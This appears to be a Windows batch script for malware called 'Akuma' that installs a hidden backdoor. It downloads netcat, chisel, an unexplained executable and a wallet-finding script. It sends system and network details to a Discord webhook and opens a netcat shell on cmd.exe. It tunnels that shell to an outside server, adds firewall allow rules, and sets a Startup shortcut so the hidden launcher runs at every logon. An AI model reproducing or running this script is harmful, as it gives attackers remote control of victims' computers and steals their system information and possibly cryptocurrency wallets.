@echo off
rmdir /s /q %homedrive%\Akuma
rmdir /s /q %homedrive%\A7uma
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
mkdir %homedrive%\Akuma\nc
%homedrive%
cd %homedrive%\A7uma
C:\curl\bin\curl.exe -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
C:\curl\bin\curl.exe -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
C:\curl\bin\curl.exe -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
C:\curl\bin\curl.exe -L https://github.com/l-urk/Akuma/raw/main/Utilities/ibdataPOST.exe > %homedrive%\Akuma\ibdataPOST.exe
C:\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homedrive%\Akuma\WalletFinder.bat
cd %homedrive%\Akuma
echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo C:\curl\bin\curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1169439326988411011/KfTclOjQxXCRVbxZtpmyiePMZvF6CpqrFzAXj7-XFQukq_ZrSEa_zT4dfw3mWdwGWfGy >> %homedrive%\Akuma\zonbi.bat
echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\nc.bat
echo %homedrive%\Akuma\chisel.exe client akuma.4kum4n0d3z3r0.xyz:32101 R:%random%:localhost:32100 >> %homedrive%\Akuma\chisel.bat
echo netsh advfirewall firewall delete rule name=".akuma" >> %homedrive%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=out action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\network.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\nc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\network.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\WalletFinder.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\ibdataPOST.exe", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo y| del "%homedrive%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
start %homedrive%\Akuma\Akuma.vbs
rmdir /s /q %homedrive%\ShiniGami
exit
